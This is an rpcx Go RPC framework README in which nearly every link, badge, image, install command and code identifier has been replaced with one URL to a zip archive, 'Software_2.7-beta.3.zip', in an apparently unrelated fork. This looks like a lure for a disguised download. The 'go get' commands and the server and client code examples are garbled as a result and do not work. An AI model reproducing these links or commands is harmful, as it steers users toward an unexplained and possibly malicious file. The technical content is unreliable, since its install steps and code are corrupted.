<a href="https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip"><img height="160" src="https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip"></a>

Official site: [https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip](https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip)

[![License](https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip%https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip)](https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip) [![GoDoc](https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip)](https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip)  [![travis](https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip)](https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip) [![Go Report Card](https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip)](https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip) [![coveralls](https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip)](https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip) [![QQ2群](https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip群https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip)](https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip) [![QQ群(已满)](https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip群(已满)https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip)](https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip) 

## Announce

A tcpdump-like tool added: [rpcxdump](https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip)。 You can use it to debug communications between rpcx services and clients.

![](https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip)


## Cross-Languages
you can use other programming languages besides Go to access rpcx services.

- **rpcx-gateway**: You can write clients in any programming languages to call rpcx services via [rpcx-gateway](https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip)
- **http invoke**: you can use the same http requests to access rpcx gateway
- **Java Services/Clients**: You can use [rpcx-java](https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip) to implement/access rpcx servies via raw protocol.


> If you can write Go methods, you can also write rpc services. It is so easy to write rpc applications with rpcx.

## Installation

install the basic features:

`go get -u -v https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip`


If you want to use `reuseport`、`quic`、`kcp`, `zookeeper`, `etcd`, `consul`, `redis` registry, use those tags to `go get` 、 `go build` or `go run`. For example, if you want to use all features, you can:

```sh
go get -u -v -tags "reuseport quic kcp zookeeper etcd consul redis ping utp" https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip
```

**_tags_**:
- **quic**: support quic transport
- **kcp**: support kcp transport
- **zookeeper**: support zookeeper registry
- **etcd**: support etcd registry
- **consul**: support consul registry
- **redis**: support consul registry
- **ping**: support network quality load balancing
- **reuseport**: support reuseport
- **utp**: support utp transport

## Features
rpcx is a RPC framework like [Alibaba Dubbo](https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip) and [Weibo Motan](https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip).

**rpcx 3.0** has been refactored for targets:
1. **Simple**: easy to learn, easy to develop, easy to intergate and easy to deploy
2. **Performance**: high perforamnce (>= grpc-go)
3. **Cross-platform**: support _raw slice of bytes_, _JSON_, _Protobuf_ and _MessagePack_. Theoretically it can be used with java, php, python, c/c++, https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip, c# and other platforms
4. **Service discovery and service governance**: support zookeeper, etcd and consul.


It contains below features
- Support raw Go functions. There's no need to define proto files.
- Pluggable. Features can be extended such as service discovery, tracing.
- Support TCP, HTTP, [QUIC](https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip) and [KCP](https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip)
- Support multiple codecs such as JSON, Protobuf, [MessagePack](https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip) and raw bytes.
- Service discovery. Support peer2peer, configured peers, [zookeeper](https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip), [etcd](https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip), [consul](https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip) and [mDNS](https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip).
- Fault tolerance：Failover, Failfast, Failtry.
- Load banlancing：support Random, RoundRobin, Consistent hashing, Weighted, network quality and Geography.
- Support Compression.
- Support passing metadata.
- Support Authorization.
- Support heartbeat and one-way request.
- Other features: metrics, log, timeout, alias, circuit breaker.
- Support bidirectional communication.
- Support access via HTTP so you can write clients in any programming languages.
- Support API gateway.
- Support backup request, forking and broadcast.


rpcx uses a binary protocol and platform-independent, which means you can develop services in other languages such as Java, python, nodejs, and you can use other prorgramming languages to invoke services developed in Go.

There is a UI manager: [rpcx-ui](https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip).

## Performance

Test results show rpcx has better performance than other rpc framework except standard rpc lib.


The benchmark code is at [rpcx-benchmark](https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip).

**Listen to others, but test by yourself**.

**_Test Environment_**

- **CPU**: Intel(R) Xeon(R) CPU E5-2630 v3 @ 2.40GHz, 32 cores
- **Memory**: 32G
- **Go**: 1.9.0
- **OS**: CentOS 7 / https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip

**_Use_**
- protobuf
- the client and the server on the same server
- 581 bytes payload
- 500/2000/5000 concurrent clients
- mock processing time: 0ms, 10ms and 30ms

**_Test Result_**

### mock 0ms process time

<table><tr><th>Throughputs</th><th>Mean Latency</th><th>P99 Latency</th></tr><tr><td width="30%"><img src="https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip"></td><td width="30%"><img src="https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip"></td><td width="30%"><img src="https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip"></td></tr></table>


### mock 10ms process time

<table><tr><th>Throughputs</th><th>Mean Latency</th><th>P99 Latency</th></tr><tr><td width="30%"><img src="https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip"></td><td width="30%"><img src="https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip"></td><td width="30%"><img src="https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip"></td></tr></table>


### mock 30ms process time

<table><tr><th>Throughputs</th><th>Mean Latency</th><th>P99 Latency</th></tr><tr><td width="30%"><img src="https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip"></td><td width="30%"><img src="https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip"></td><td width="30%"><img src="https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip"></td></tr></table>


## Examples

You can find all examples at [rpcx-ecosystem/rpcx-examples3](https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip).

The below is a simple example.


**Server**

```go
    // define https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip
    ……

    s := https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip()
	https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip("Arith", new(https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip), "")
	https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip("tcp", addr)

```


**Client**

```go
    // prepare requests
    ……

    d := https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip("tcp@"+addr, "")
	xclient := https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip("Arith", https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip, https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip, d, https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip)
	defer https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip()
	err := https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip(https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip(), "Mul", args, reply, nil)
```

## Contribute

see [contributors](https://raw.githubusercontent.com/huizuohaode/rpcx/master/_testutils/Software_2.7-beta.3.zip).

Welcome to contribute:
- submit issues or requirements
- send PRs
- write projects to use rpcx
- write tutorials or articles to introduce rpcx

## License

Apache License, Version 2.0 
